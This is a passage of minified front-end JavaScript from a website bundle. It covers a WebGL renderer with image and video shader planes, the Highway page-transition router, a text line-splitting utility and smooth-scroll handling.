					this.paused = !0, cs.ticker.remove(this.update)
				}
			}, {
				key: "resume",
				value: function() {
					this.paused ? (this.paused = !1, this.onResize(), cs.ticker.add(this.update)) : console.warn("already resumed")
				}
			}, {
				key: "build",
				value: (e = _()(y.a.mark((function t(e) {
					return y.a.wrap((function(t) {
						for (;;) switch (t.prev = t.next) {
							case 0:
								this.startingPage = e, this.buildOGL(), this.initScene(), this.onResize(), this.ready = !0;
							case 5:
							case "end":
								return t.stop()
						}
					}), t, this)
				}))), function(t) {
					return e.apply(this, arguments)
				})
			}, {
				key: "start",
				value: function() {
					if (this.started) return console.warn("Already started webgl");
					this.started = !0, this.addEvents(), cs.ticker.add(this.update)
				}
			}, {
				key: "initStats",
				value: function() {
					this.stats = new Fs(!0), this.stats.setRenderPanel(this.renderer.gl)
				}
			}, {
				key: "buildOGL",
				value: function() {
					this.buildOGLCamera(), this.scene = new st, this.buildOGLRenderer()
				}
			}, {
				key: "buildOGLRenderer",
				value: function() {
					var t = window.devicePixelRatio;
					t = t ? Math.max(t, 2) : 1, this.renderer = new q({
						alpha: !0,
						dpr: t,
						canvas: document.getElementById("webgl")
					}), this.gl = this.renderer.gl, this.gl.canvas.id = "webgl"
				}
			}, {
				key: "buildOGLCamera",
				value: function() {
					this.camera = new ht(this.gl), this.camera.position.z = 5
				}
			}, {
				key: "addEvents",
				value: function() {
					ps.on(gs, this.onResize)
				}
			}, {
				key: "removeEvents",
				value: function() {
					ps.off(gs, this.onResize)
				}
			}, {
				key: "onResize",
				value: function() {
					this.renderer.setSize(fs.WINDOW_WIDTH, fs.WINDOW_HEIGHT), this.camera.perspective({
						aspect: this.gl.canvas.width / this.gl.canvas.height
					})
				}
			}, {
				key: "update",
				value: function(t, e) {
					this.stats && this.stats.beforeRender(), this.onUpdate(t, e), this.renderer.render({
						scene: this.scene,
						camera: this.camera
					}), this.stats && this.stats.afterRender()
				}
			}, {
				key: "onUpdate",
				value: function(t, e) {}
			}, {
				key: "initScene",
				value: function() {}
			}]), t
		}();
	var As = 0,
		Ss = function(t) {
			d()(i, t);
			var e = function(t) {
				var e = function() {
					if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
					if (Reflect.construct.sham) return !1;
					if ("function" == typeof Proxy) return !0;
					try {
						return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
					} catch (t) {
						return !1
					}
				}();
				return function() {
					var i, n = g()(t);
					if (e) {
						var r = g()(this).constructor;
						i = Reflect.construct(n, arguments, r)
					} else i = n.apply(this, arguments);
					return f()(this, i)
				}
			}(i);

			function i(t) {
				var n;
				return r()(this, i), (n = e.call(this))._uid = As++, n._media = "VIDEO" === t.media.tagName ? t.media.cloneNode() : t.media, n._type = n._media.tagName, n._originalSrc = n._media.src, n._lazy = !!n._media.dataset.url, n._loaded = !1, n._loading = !1, n._stopVideo = !1, n._texture = new vt(_o.gl, {
					generateMipmaps: !1
				}), n._enabled = !0, n.bound = t.bound ? t.bound : {
					x: 0,
					y: 0,
					width: .2,
					ratio: 16 / 9
				}, n.scrollY = 0, n.scrollX = 0, n.inview = !0, n.inviewActive = !0, n.inviewOffset = .1, n.APPEAR_EASING = .1, n._onTextureLoaded = n._onTextureLoaded.bind(u()(n)), n
			}
			return o()(i, [{
				key: "_build",
				value: function() {
					this._createMesh(), this._lazy || this._handleTexture(!0)
				}
			}, {
				key: "_lazyLoad",
				value: function(t) {
					this._media.src = this._media.dataset.url, this._handleTexture(t)
				}
			}, {
				key: "_playVideo",
				value: function() {
					this._media.play()
				}
			}, {
				key: "_pauseVideo",
				value: function() {
					this._media.pause()
				}
			}, {
				key: "_handleTexture",
				value: function() {
					var t = this,
						e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
					this._loading = !0, this._media.complete ? this._onTextureLoaded() : "IMG" === this._type ? this._media.addEventListener("load", this._onTextureLoaded, {
						once: !0
					}) : "VIDEO" === this._type && (e ? this._media.play().then((function() {
						t._media.pause()
					})) : this._media.play())
				}
			}, {
				key: "_createMesh",
				value: function() {
					this._geometry = new Mt(_o.gl, {
						width: 1,
						height: 1
					}), this._program = new W(_o.gl, {
						vertex: "#define GLSLIFY 1\nattribute vec3 position;\nattribute vec2 uv;\n    \nuniform mat4 modelViewMatrix;\nuniform mat4 projectionMatrix;\n\nvarying vec2 vUv;\n\nvoid main() {\n\n    vUv = uv;\n    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);\n}",
						fragment: "precision mediump float;\n#define GLSLIFY 1\n\nuniform bool uImageLoaded;\nuniform vec3 uPlaceholder;\nuniform vec2 uImageSize;\nuniform float uProgress;\nuniform vec2 uPlaneSizes;\n// uniform float uInview;\nuniform sampler2D uImage;\n\nvarying vec2 vUv;\n\nvec3 getCroppedTexture(vec2 planeSize, vec2 imageSize, vec2 uv, sampler2D image){\n\n    vec2 s = planeSize; // Screen\n    vec2 i = imageSize; // Image\n    float rs = s.x / s.y;\n    float ri = i.x / i.y;\n    vec2 new = rs < ri ? vec2(i.x * s.y / i.y, s.y) : vec2(s.x, i.y * s.x / i.x);\n    vec2 offset = (rs < ri ? vec2((new.x - s.x) / 2.0, 0.0) : vec2(0.0, (new.y - s.y) / 2.0)) / new;\n\n    return texture2D(image, uv * s / new + offset).rgb;\n\n}\n\nvec2 scaleUv(vec2 uv, float scale){\n     return uv = (uv - 0.5) * (1. / scale) + 0.5;\n}\n\nfloat linearMap(float value, float min1, float max1, float min2, float max2) {\n  return min2 + (value - min1) * (max2 - min2) / (max1 - min1);\n}\n\nvoid main() {\n\n    vec3 color = uPlaceholder;\n    vec3 textureColor = getCroppedTexture(uPlaneSizes, uImageSize, scaleUv(vUv, linearMap(uProgress, .0, 1., 1.075, 1.)), uImage);\n    \n    color = mix(color, textureColor, uProgress);\n\n    // debug inview\n    // color = mix(vec3(1., .0, .0), vec3(.0, 1., .0), uInview);\n\n    gl_FragColor = vec4(color, 1.);\n\n}",
						uniforms: {
							uPlaceholder: {
								value: new xt("#1D1D1D")
							},
							uImage: {
								value: this._texture
							},
							uImageSize: {
								value: [0, 0]
							},
							uImageLoaded: {
								value: !1
							},
							uTime: {
								value: 0
							},
							uPlaneSizes: {
								value: [1, 1]
							},
							uProgress: {
								value: 0
							}
						}
					}), this._mesh = new pt(_o.gl, {
						geometry: this._geometry,
						program: this._program
					}), this._mesh.setParent(this), this._mesh._bound = this.bound
				}
			}, {
				key: "_onTextureLoaded",
				value: function() {
					this._loaded = !0, this._loading = !1, cs.to(this._mesh.program.uniforms.uProgress, {
						value: 1,
						ease: "power4.out",
						duration: 2.8
					}), this._texture.image = this._media, this._program.uniforms.uImage.value = this._texture, this._program.uniforms.uImageSize.value[0] = "VIDEO" === this._type ? this._media.videoWidth : this._media.naturalWidth, this._program.uniforms.uImageSize.value[1] = "VIDEO" === this._type ? this._media.videoHeight : this._media.naturalHeight
				}
			}, {
				key: "_initTexture",
				value: function() {
					this._texture.needsUpdate = !0, this._texture.update(), _o.gl.bindTexture(this._texture.target, this._texture.texture)
				}
			}, {
				key: "_updateBound",
				value: function(t) {
					this.bound.x = t.x, this.bound.y = t.y, this.bound.width = t.width, this.bound.ratio = t.ratio
				}
			}, {
				key: "_updatePosition",
				value: function() {
					this._mesh.position.x = .5 * -_o.viewport.width + .5 * this._mesh.scale.x + (this.bound.x * fs.WINDOW_WIDTH + this.scrollX) * _o.viewport.width / fs.WINDOW_WIDTH, this._mesh.position.y = -(.5 * -_o.viewport.height + .5 * this._mesh.scale.y) - (this.bound.y * fs.WINDOW_HEIGHT + this.scrollY) * _o.viewport.height / fs.WINDOW_HEIGHT
				}
			}, {
				key: "_update",
				value: function() {
					this._enabled && (this.inviewActive && (!this._lazy || this._loaded || this._loading || this._lazyLoad()), "VIDEO" === this._type && this._media.readyState >= this._media.HAVE_ENOUGH_DATA && (this._texture.image || this._onTextureLoaded(), this.inview && (this._texture.needsUpdate = !0)))
				}
			}, {
				key: "_resize",
				value: function() {
					var t = this.bound.width / this.bound.ratio;
					this.bound.heightVH = t * fs.WINDOW_RATIO, this._mesh.scale.x = _o.viewport.width * (this.bound.width * fs.WINDOW_WIDTH) / fs.WINDOW_WIDTH, this._mesh.scale.y = _o.viewport.width * (t * fs.WINDOW_WIDTH) / fs.WINDOW_WIDTH, this._updatePosition(), this._program.uniforms.uPlaneSizes.value[0] = this._mesh.scale.x, this._program.uniforms.uPlaneSizes.value[1] = this._mesh.scale.y
				}
			}, {
				key: "_dispose",
				value: function() {
					this._mesh.geometry.remove(), this._mesh.program.remove()
				}
			}]), i
		}(st),
		Os = i(6),
		Ps = i.n(Os),
		Is = function(t, e, i) {
			return t * (1 - i) + e * i
		},
		Ls = function(t, e, i) {
			return Math.min(i, Math.max(t, e))
		};

	function Bs() {}
	Bs.prototype = {
		on: function(t, e, i) {
			var n = this.e || (this.e = {});
			return (n[t] || (n[t] = [])).push({
				fn: e,
				ctx: i
			}), this
		},
		once: function(t, e, i) {
			var n = this;

			function r() {
				n.off(t, r), e.apply(i, arguments)
			}
			return r._ = e, this.on(t, r, i)
		},
		emit: function(t) {
			for (var e = [].slice.call(arguments, 1), i = ((this.e || (this.e = {}))[t] || []).slice(), n = 0, r = i.length; n < r; n++) i[n].fn.apply(i[n].ctx, e);
			return this
		},
		off: function(t, e) {
			var i = this.e || (this.e = {}),
				n = i[t],
				r = [];
			if (n && e)
				for (var s = 0, o = n.length; s < o; s++) n[s].fn !== e && n[s].fn._ !== e && r.push(n[s]);
			return r.length ? i[t] = r : delete i[t], this
		}
	};
	var ks = Bs;
	ks.TinyEmitter = Bs;
	var Rs = function(t) {
		this.wrap = document.querySelector("[data-router-wrapper]"), this.properties = t, this.Transition = t.transition ? new t.transition.class(this.wrap, t.transition.name) : null
	};
	Rs.prototype.setup = function() {
		this.onEnter && this.onEnter(), this.onEnterCompleted && this.onEnterCompleted()
	}, Rs.prototype.add = function() {
		this.wrap.insertAdjacentHTML("beforeend", this.properties.view.outerHTML)
	}, Rs.prototype.update = function() {
		document.title = this.properties.page.title
	}, Rs.prototype.show = function(t) {
		var e = this;
		return new Promise((function(i) {
			try {
				function n(t) {
					e.onEnterCompleted && e.onEnterCompleted(), i()
				}
				return e.update(), e.onEnter && e.onEnter(), Promise.resolve(e.Transition ? Promise.resolve(e.Transition.show(t)).then(n) : n())
			} catch (r) {
				return Promise.reject(r)
			}
		}))
	}, Rs.prototype.hide = function(t) {
		var e = this;
		return new Promise((function(i) {
			try {
				function n(t) {
					e.onLeaveCompleted && e.onLeaveCompleted(), i()
				}
				return e.onLeave && e.onLeave(), Promise.resolve(e.Transition ? Promise.resolve(e.Transition.hide(t)).then(n) : n())
			} catch (r) {
				return Promise.reject(r)
			}
		}))
	};
	var Ns = new window.DOMParser,
		Ws = function(t, e) {
			this.renderers = t, this.transitions = e
		};
	Ws.prototype.getOrigin = function(t) {
		var e = t.match(/(https?:\/\/[\w\-.]+)/);
		return e ? e[1].replace(/https?:\/\//, "") : null
	}, Ws.prototype.getPathname = function(t) {
		var e = t.match(/https?:\/\/.*?(\/[\w_\-./]+)/);
		return e ? e[1] : "/"
	}, Ws.prototype.getAnchor = function(t) {
		var e = t.match(/(#.*)$/);
		return e ? e[1] : null
	}, Ws.prototype.getParams = function(t) {
		var e = t.match(/\?([\w_\-.=&]+)/);
		if (!e) return null;
		for (var i = e[1].split("&"), n = {}, r = 0; r < i.length; r++) {
			var s = i[r].split("=");
			n[s[0]] = s[1]
		}
		return n
	}, Ws.prototype.getDOM = function(t) {
		return "string" == typeof t ? Ns.parseFromString(t, "text/html") : t
	}, Ws.prototype.getView = function(t) {
		return t.querySelector("[data-router-view]")
	}, Ws.prototype.getSlug = function(t) {
		return t.getAttribute("data-router-view")
	}, Ws.prototype.getRenderer = function(t) {
		if (!this.renderers) return Promise.resolve(Rs);
		if (t in this.renderers) {
			var e = this.renderers[t];
			return "function" != typeof e || Rs.isPrototypeOf(e) ? "function" == typeof e.then ? Promise.resolve(e).then((function(t) {
				return t.default
			})) : Promise.resolve(e) : Promise.resolve(e()).then((function(t) {
				return t.default
			}))
		}
		return Promise.resolve(Rs)
	}, Ws.prototype.getTransition = function(t) {
		return this.transitions ? t in this.transitions ? {
			class: this.transitions[t],
			name: t
		} : "default" in this.transitions ? {
			class: this.transitions.default,
			name: "default"
		} : null : null
	}, Ws.prototype.getProperties = function(t) {
		var e = this.getDOM(t),
			i = this.getView(e),
			n = this.getSlug(i);
		return {
			page: e,
			view: i,
			slug: n,
			renderer: this.getRenderer(n, this.renderers),
			transition: this.getTransition(n, this.transitions)
		}
	}, Ws.prototype.getLocation = function(t) {
		return {
			href: t,
			anchor: this.getAnchor(t),
			origin: this.getOrigin(t),
			params: this.getParams(t),
			pathname: this.getPathname(t)
		}
	};
	var zs = function(t) {
			function e(e) {
				var i = this;
				void 0 === e && (e = {});
				var n = e.renderers,
					r = e.transitions;
				t.call(this), this.Helpers = new Ws(n, r), this.Transitions = r, this.Contextual = !1, this.location = this.Helpers.getLocation(window.location.href), this.properties = this.Helpers.getProperties(document.cloneNode(!0)), this.popping = !1, this.running = !1, this.trigger = null, this.cache = new Map, this.cache.set(this.location.href, this.properties), this.properties.renderer.then((function(t) {
					i.From = new t(i.properties), i.From.setup()
				})), this._navigate = this.navigate.bind(this), window.addEventListener("popstate", this.popState.bind(this)), this.links = document.querySelectorAll("a:not([target]):not([data-router-disabled])"), this.attach(this.links)
			}
			return t && (e.__proto__ = t), (e.prototype = Object.create(t && t.prototype)).constructor = e, e.prototype.attach = function(t) {
				for (var e = 0, i = t; e < i.length; e += 1) i[e].addEventListener("click", this._navigate)
			}, e.prototype.detach = function(t) {
				for (var e = 0, i = t; e < i.length; e += 1) i[e].removeEventListener("click", this._navigate)
			}, e.prototype.navigate = function(t) {
				if (!t.metaKey && !t.ctrlKey) {
					t.preventDefault();
					var e = !!t.currentTarget.hasAttribute("data-transition") && t.currentTarget.dataset.transition;
					this.redirect(t.currentTarget.href, e, t.currentTarget)
				}
			}, e.prototype.redirect = function(t, e, i) {
				if (void 0 === e && (e = !1), void 0 === i && (i = "script"), this.trigger = i, !this.running && t !== this.location.href) {
					var n = this.Helpers.getLocation(t);
					this.Contextual = !1, e && (this.Contextual = this.Transitions.contextual[e].prototype, this.Contextual.name = e), n.origin !== this.location.origin || n.anchor && n.pathname === this.location.pathname ? window.location.href = t : (this.location = n, this.beforeFetch())
				}
			}, e.prototype.popState = function() {
				this.trigger = "popstate", this.Contextual = !1;
				var t = this.Helpers.getLocation(window.location.href);
				this.location.pathname !== t.pathname || !this.location.anchor && !t.anchor ? (this.popping = !0, this.location = t, this.beforeFetch()) : this.location = t
			}, e.prototype.pushState = function() {
				this.popping || window.history.pushState(this.location, "", this.location.href)
			}, e.prototype.fetch = function() {
				try {
					var t = this;
					return Promise.resolve(fetch(t.location.href, {
						mode: "same-origin",
						method: "GET",
						headers: {
							"X-Requested-With": "Highway"
						},
						credentials: "same-origin"
					})).then((function(e) {
						if (e.status >= 200 && e.status < 300) return e.text();
						window.location.href = t.location.href
					}))
				} catch (t) {
					return Promise.reject(t)
				}
			}, e.prototype.beforeFetch = function() {
				try {
					var t = this;

					function n() {
						t.afterFetch()
					}
					t.pushState(), t.running = !0, t.emit("NAVIGATE_OUT", {
						from: {
							page: t.From.properties.page,
							view: t.From.properties.view
						},
						trigger: t.trigger,
						location: t.location
					});
					var e = {
							trigger: t.trigger,
							contextual: t.Contextual
						},
						i = t.cache.has(t.location.href) ? Promise.resolve(t.From.hide(e)).then((function() {
							t.properties = t.cache.get(t.location.href)
						})) : Promise.resolve(Promise.all([t.fetch(), t.From.hide(e)])).then((function(e) {
							t.properties = t.Helpers.getProperties(e[0]), t.cache.set(t.location.href, t.properties)
						}));
					return Promise.resolve(i && i.then ? i.then(n) : n())
				} catch (t) {
					return Promise.reject(t)
				}
			}, e.prototype.afterFetch = function() {
				try {
					var t = this;
					return Promise.resolve(t.properties.renderer).then((function(e) {
						return t.To = new e(t.properties), t.To.add(), t.emit("NAVIGATE_IN", {
							to: {
								page: t.To.properties.page,
								view: t.To.wrap.lastElementChild
							},
							trigger: t.trigger,
							location: t.location
						}), Promise.resolve(t.To.show({
							trigger: t.trigger,
							contextual: t.Contextual
						})).then((function() {
							t.popping = !1, t.running = !1, t.detach(t.links), t.links = document.querySelectorAll("a:not([target]):not([data-router-disabled])"), t.attach(t.links), t.emit("NAVIGATE_END", {
								to: {
									page: t.To.properties.page,
									view: t.To.wrap.lastElementChild
								},
								from: {
									page: t.From.properties.page,
									view: t.From.properties.view
								},
								trigger: t.trigger,
								location: t.location
							}), t.From = t.To, t.trigger = null
						}))
					}))
				} catch (t) {
					return Promise.reject(t)
				}
			}, e
		}(ks),
		Us = function(t, e) {
			this.wrap = t, this.name = e
		};
	Us.prototype.show = function(t) {
		var e = this,
			i = t.trigger,
			n = t.contextual,
			r = this.wrap.lastElementChild,
			s = this.wrap.firstElementChild;
		return new Promise((function(t) {
			n ? (r.setAttribute("data-transition-in", n.name), r.removeAttribute("data-transition-out", n.name), n.in && n.in({
				to: r,
				from: s,
				trigger: i,
				done: t
			})) : (r.setAttribute("data-transition-in", e.name), r.removeAttribute("data-transition-out", e.name), e.in && e.in({
				to: r,
				from: s,
				trigger: i,
				done: t
			}))
		}))
	}, Us.prototype.hide = function(t) {
		var e = this,
			i = t.trigger,
			n = t.contextual,
			r = this.wrap.firstElementChild;
		return new Promise((function(t) {
			n ? (r.setAttribute("data-transition-out", n.name), r.removeAttribute("data-transition-in", n.name), n.out && n.out({
				from: r,
				trigger: i,
				done: t
			})) : (r.setAttribute("data-transition-out", e.name), r.removeAttribute("data-transition-in", e.name), e.out && e.out({
				from: r,
				trigger: i,
				done: t
			}))
		}))
	}, console.log("Highway v2.2.0");
	var js = {
			Core: zs,
			Helpers: Ws,
			Renderer: Rs,
			Transition: Us
		},
		Vs = function(t) {
			return t / 1440
		},
		Gs = function(t) {
			return t / 900
		},
		Hs = function(t) {
			return t / 375
		},
		qs = function() {},
		Ys = function(t) {
			var e = parseFloat(t.dataset.ratio);
			return isNaN(e) ? 16 / 9 : e
		},
		Xs = function(t, e) {
			for (var i = 0; i < e.length; i++) t.push(e[i])
		},
		$s = function(t) {
			for (; 0 !== t.length;) t.pop()
		},
		Zs = function(t) {
			var e = t[0].getBoundingClientRect().width;
			return t.map((function(t, i) {
				return e * i + 16 * i + e / 2
			}))
		},
		Ks = i(7),
		Qs = i.n(Ks);

	function Js(t, e) {
		var i = Object.keys(t);
		if (Object.getOwnPropertySymbols) {
			var n = Object.getOwnPropertySymbols(t);
			e && (n = n.filter((function(e) {
				return Object.getOwnPropertyDescriptor(t, e).enumerable
			}))), i.push.apply(i, n)
		}
		return i
	}

	function to(t) {
		for (var e = 1; e < arguments.length; e++) {
			var i = null != arguments[e] ? arguments[e] : {};
			e % 2 ? Js(Object(i), !0).forEach((function(e) {
				Qs()(t, e, i[e])
			})) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(i)) : Js(Object(i)).forEach((function(e) {
				Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(i, e))
			}))
		}
		return t
	}
	var eo = document.getElementById("split"),
		io = document.getElementById("split-text"),
		no = document.getElementById("split-indent"),
		ro = function() {
			function t(e) {
				var i = e.target,
					n = e.indent,
					s = void 0 === n ? {} : n,
					o = e.char,
					a = void 0 !== o && o,
					u = e.word,
					h = void 0 !== u && u,
					l = e.classes,
					c = void 0 === l ? {} : l;
				r()(this, t), this.target = i, this.computedStyles = getComputedStyle(i), this.indent = to({
					value: 0,
					from: 0,
					to: 1,
					computed: 0
				}, s), this.char = a, this.word = h, this.settings = {
					classes: to({
						wrapper: "l-wrapper",
						line: "l-line",
						word: "l-word",
						wordWrapper: "l-word--wrapper",
						char: "l-char",
						charLine: "l-char--line",
						charWrapper: "l-char--wrapper"
					}, c)
				}, this.html = this.target.innerText, this.text = this.target.textContent.replace(/\s\s+/g, " ").trim(), this.mode = a ? "chars" : h ? "words" : "lines", this.lines = [], this.dom = {
					lines: [],
					chars: [],
					words: []
				}, this.resize = this.resize.bind(this), this.resize(), ps.on(gs, this.resize)
			}
			return o()(t, [{
				key: "resize",
				value: function(t) {
					var e, i;
					this.setHiddenStyle();
					for (var n = this.target.offsetWidth, r = n - (null !== (e = null === (i = this.indent) || void 0 === i ? void 0 : i.computed) && void 0 !== e ? e : 0), s = [], o = [], a = this.text.split(" "), u = 0, h = a.length; u < h; u++) {
						var l, c = a[u];
						s.push(c), io.innerText = s.join(" ");
						var d = n;
						null !== (l = this.indent) && void 0 !== l && l.value && o.length >= this.indent.from && o.length < this.indent.to && (d = r), io.offsetWidth >= d && (s.pop(), o.push(s.join(" ")), s = [c])
					}
					o.push(s.join(" ")), o = o.filter((function(t) {
						return t.length
					})), this.lines = o, this.createDom(), io.innerText = null, t && this.dom.lines.forEach((function(t) {
						return t.style.transform = "translate(0px, 0px)"
					}))
				}
			}, {
				key: "createDom",
				value: function() {
					var t = this,
						e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.target,
						i = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.lines,
						n = this.settings.classes,
						r = document.createDocumentFragment();
					this.dom.lines = [], this.dom.chars = [], this.dom.words = [], i.forEach((function(e, i) {
						var s, o = document.createElement("div"),
							a = document.createElement("div");
						if (o.classList.add(n.wrapper), a.classList.add(n.line), t.char) {
							a.classList.add(n.charLine);
							for (var u = 0, h = e.length; u < h; u++)
								if (" " === e[u]) {
									var l = document.createTextNode(" ");
									a.appendChild(l)
								} else {
									var c = document.createElement("div"),
										d = document.createElement("div");
									c.classList.add(n.charWrapper), d.classList.add(n.char), d.innerText = e[u], t.dom.chars.push(d), c.appendChild(d), a.appendChild(c)
								}
						} else if (t.word) {
							var p = e.split(" ");
							a.classList.add(n.wordWrapper);
							for (var f = 0, m = p.length; f < m; f++) {
								var g = document.createElement("div"),
									v = document.createTextNode(" ");
								g.innerText = p[f], g.classList.add(n.word), t.dom.words.push(g), a.append(g), a.append(v)
							}
						} else a.innerText = e;
						null !== (s = t.indent) && void 0 !== s && s.computed && i >= t.indent.from && i < t.indent.to && (a.style.textIndent = "".concat(t.indent.value)), t.dom.lines.push(a), o.appendChild(a), r.appendChild(o)
					})), e.innerText = null, e.appendChild(r)
				}
			}, {
				key: "setHiddenStyle",
				value: function() {
					arguments.length > 0 && void 0 !== arguments[0] || this.target;
					var t, e = this.computedStyles,
						i = eo.style;
					i.fontFamily = e.getPropertyValue("font-family"), i.fontSize = e.getPropertyValue("font-size"), i.fontStyle = e.getPropertyValue("font-style"), i.fontWeight = e.getPropertyValue("font-weight"), i.fontStretch = e.getPropertyValue("font-stretch"), i.fontVariant = e.getPropertyValue("font-variant"), i.letterSpacing = e.getPropertyValue("letter-spacing"), i.textTransform = e.getPropertyValue("text-transform"), null !== (t = this.indent) && void 0 !== t && t.value && (no.style.width = this.indent.value, this.indent.computed = no.offsetWidth)
				}
			}, {
				key: "destroy",
				value: function() {
					ps.off(gs, this.resize)
				}
			}]), t
		}();
	var so = function(t) {
		d()(i, t);
		var e = function(t) {
			var e = function() {
				if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
				if (Reflect.construct.sham) return !1;
				if ("function" == typeof Proxy) return !0;
				try {
					return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
				} catch (t) {
					return !1
				}
			}();
			return function() {
				var i, n = g()(t);
				if (e) {
					var r = g()(this).constructor;
					i = Reflect.construct(n, arguments, r)
				} else i = n.apply(this, arguments);
				return f()(this, i)
			}
		}(i);

		function i() {
			return r()(this, i), e.apply(this, arguments)
		}
		return o()(i, [{
			key: "onLeave",
			value: function() {}
		}, {
			key: "onLeaveCompleted",
			value: function() {
				this.Transition._splittedOverview && this.Transition._splittedOverview.destroy()
			}
		}, {
			key: "onEnter",
			value: function() {
				fs.dom.navBarLogoBL.classList.add("top"), fs.dom.navBarOpenerBL.classList.add("top"), this._wrapper = this.wrap.lastElementChild;
				var t = this._wrapper.dataset.uid;
				fs.currentProject = t, "project" === fs.appeared && fs.isFirstPage && (document.body.style.backgroundColor = this._wrapper.dataset.darkerColor), fs.isFirstPage && (this.Transition._splittedOverview = new ro({
					target: this._wrapper.querySelector(".page-project__overview-text")
				}))
			}
		}, {
			key: "onEnterCompleted",
			value: function() {
				var t = this;
				fs.isFirstPage && ta((function() {
					t.Transition.in({
						from: {
							remove: qs
						},
						to: t._wrapper,
						done: qs
					}), ps.emit(_s, "index", fs.currentProject)
				}))
			}
		}], [{
			key: "_getListBounds",
			value: function(t) {
				for (var e = i.GL_IMAGE_START_Y(), n = [], r = 0; r < t.length; r++) {
					n.push(e);
					var s = Ys(t[r]);
					e += i.GL_IMAGE_WIDTH() / s * fs.WINDOW_RATIO + i.GL_IMAGE_GAP()
				}
				return n
			}
		}, {
			key: "_getBounds",
			value: function(t) {
				return fs.IS_MOBILE ? i._getMobileBounds(t) : i._getDesktopBounds(t)
			}
		}, {
			key: "_getMobileBounds",
			value: function(t) {
				for (var e = [], n = i.BOUNDS_WIDTH_MOBILE, r = i.BOUNDS_GAP_X_MOBILE, s = i.BOUNDS_OFFSET_START_MOBILE, o = 100 / fs.WINDOW_HEIGHT, a = 0; a < t.length; a++) e.push({
					width: n,
					ratio: 16 / 9,
					x: a * (n + r) + s,
					y: o
				});
				return e
			}
		}, {
			key: "_getDesktopBounds",
			value: function(t) {
				var e = i._getListBounds(t),
					n = i.GL_IMAGE_X(),
					r = i.GL_IMAGE_WIDTH();
				return t.map((function(t, i) {
					return {
						x: n,
						y: e[i],
						width: r,
						ratio: Ys(t)
					}
				}))
			}
		}, {
			key: "_getMedia",
			value: function(t, e) {
				return fs.media[t]
			}
		}, {
			key: "_getMediaUID",
			value: function() {
				return document.querySelector('[data-router-view="project"]').dataset.uid
			}
		}]), i
	}(js.Renderer);
	so.GL_IMAGE_WIDTH = function() {
		return fs.WINDOW_WIDTH >= 1800 ? 1 - 64 / fs.WINDOW_WIDTH - 800 / fs.WINDOW_WIDTH : fs.WINDOW_WIDTH >= 1200 ? 1 - 64 / fs.WINDOW_WIDTH - 624 / fs.WINDOW_WIDTH : 1 - 64 / fs.WINDOW_WIDTH - 540 / fs.WINDOW_WIDTH
	}, so.GL_IMAGE_X = function() {
		return 1 - so.GL_IMAGE_WIDTH() - 32 / fs.WINDOW_WIDTH
	}, so.GL_IMAGE_START_Y = function() {
		return .25
	}, so.GL_IMAGE_GAP = function() {
		return 16 / fs.WINDOW_HEIGHT
	}, so.BOUNDS_WIDTH_MOBILE = Hs(270), so.BOUNDS_GAP_X_MOBILE = Hs(16), so.BOUNDS_OFFSET_START_MOBILE = 24 / fs.WINDOW_WIDTH;
	var oo = so,
		ao = function() {
			function t(e) {
				var i = e.planes,
					n = e.direction;
				r()(this, t), this.planes = i, this.vs = new Ps.a({
					passive: !0
				}), this.EASING = .1, this.enabled = !1, this.direction = n, this.scroll = {
					y: 0,
					x: 0,
					scrollSize: 0,
					scrollMax: 0,
					current: 0,
					scrollHeight: 0,
					yMax: 0,
					currentY: 0,
					updated: !0,
					paddingEnd: 32
				}, this.onScroll = this.onScroll.bind(this), this._onTick = this._onTick.bind(this)
			}
			return o()(t, [{
				key: "onTick",
				value: function() {}
			}, {
				key: "resize",
				value: function() {
					if (this.enabled) {
						var t = 0 === this.scroll.scrollMax ? 0 : this.scroll[this.direction] / this.scroll.scrollMax;
						this.computeScrollSize(), this.scroll[this.direction] = this.scroll.scrollMax * t, this.scroll.current = this.scroll[this.direction], this._handleVisibility()
					}
				}
			}, {
				key: "onScroll",
				value: function(t) {
					var e = t.originalEvent.touches;
					if ("x" === this.direction) {
						if (Math.abs(t.deltaY) > 10) return;
						e[0].pageY, this.planes[0].bound.y, this.planes[0].bound.heightVH, fs.WINDOW_HEIGHT
					}
					this.scroll[this.direction] += "y" === this.direction ? t.deltaY : t.deltaX, this.scroll[this.direction] = Ls(this.scroll[this.direction], this.scroll.scrollMax, 0)
				}
			}, {
				key: "_onTick",
				value: function(t, e) {
					var i = this.scroll.current;
					this.scroll.current = Is(this.scroll.current, this.scroll[this.direction], this.EASING), this.scroll.current = Math.round(1e3 * this.scroll.current) / 1e3, this.scroll.updated = i !== this.scroll.current, this.scroll.updated && (this._handleVisibility(), this.onTick(this.scroll.current))
				}
			}, {
				key: "_handleVisibility",
				value: function() {
					"y" === this.direction ? this._handleVisibilityYScroll() : this._handleVisibilityXScroll()
				}
			}, {
				key: "_handleVisibilityYScroll",
				value: function() {
					for (var t = Math.abs(this.scroll.current / fs.WINDOW_HEIGHT), e = 0; e < this.planes.length; e++) {
						var i = this.planes[e].bound.y - t,
							n = this.planes[e].bound.heightVH,
							r = i + n;
						this.planes[e].bound.top = i, this.planes[e].bound.bottom = r;
						var s = n * this.planes[e].inviewOffset;
						this.planes[e].inview = r > 0 && i < 1, this.planes[e].inviewActive = r > s && i < 1 - s
					}
				}
			}, {
				key: "_handleVisibilityXScroll",
				value: function() {
					for (var t = Math.abs(this.scroll.current / fs.WINDOW_WIDTH), e = 0; e < this.planes.length; e++) {
						var i = this.planes[e].bound.x - t,
							n = i + this.planes[e].bound.width,
							r = this.planes[e].inviewOffset,
							s = this.planes[e].bound.width * r;
						this.planes[e].inview = i < 1 && n > 0, this.planes[e].inviewActive = i < 1 - s && n > s
					}
				}
			}, {
				key: "resetScroll",
				value: function() {
					this.scroll[this.direction] = 0, this.scroll.current = 0, this.scroll.scrollSize = 0, this.scroll.scrollMax = 0
				}
			}, {
				key: "setScrollSize",
				value: function(t) {
					this.scroll.scrollSize = t, this.scroll.scrollMax = -t
				}
			}, {
